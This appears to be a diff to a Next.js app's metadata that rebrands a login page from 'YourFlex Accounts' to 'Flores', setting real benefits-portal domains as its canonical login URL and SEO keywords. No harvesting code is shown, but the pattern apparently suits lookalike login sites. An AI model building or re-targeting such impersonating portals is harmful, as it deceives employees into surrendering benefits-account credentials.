@@ -7,22 +7,22 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://flores247.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "flores247.wealthcareportal.com";
+const SITE_BRAND = "Flores";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "Flores - Login",
+    template: "%s | Flores",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
+    "Flores",
+    "Flores247",
+    "flores247.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
     "FSA login",
@@ -37,11 +37,11 @@ export const metadata: Metadata = {
     "employer portal",
     "handshake authentication"
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "Flores" }],
+  creator: "Flores",
+  publisher: "Flores",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +58,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Flores - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +73,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Flores - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through Flores.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
